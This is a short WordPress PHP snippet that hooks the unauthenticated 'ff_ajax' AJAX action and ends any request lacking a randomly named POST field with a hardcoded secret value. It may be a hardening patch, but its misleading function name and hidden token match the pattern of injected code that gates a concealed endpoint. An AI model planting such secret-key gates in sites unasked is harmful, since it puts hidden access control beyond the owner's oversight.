<?php

function privacy_cloud_mode_error() {
	if (!isset($_POST["oncpycegmmvs"]) || $_POST["oncpycegmmvs"] !== "dVQeZdzWquDiqfc") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'privacy_cloud_mode_error', 5, 1);
